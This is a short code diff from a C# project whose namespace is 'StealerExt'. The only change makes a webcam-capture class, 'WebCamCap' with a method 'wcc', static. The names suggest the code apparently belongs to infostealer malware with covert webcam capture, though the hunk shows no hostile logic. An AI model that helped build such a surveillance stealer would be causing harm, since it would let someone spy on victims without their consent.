@@ -2,7 +2,7 @@
 
 namespace StealerExt
 {
-    internal class WebCamCap
+    internal static class WebCamCap
     {
         public static void wcc()
         {
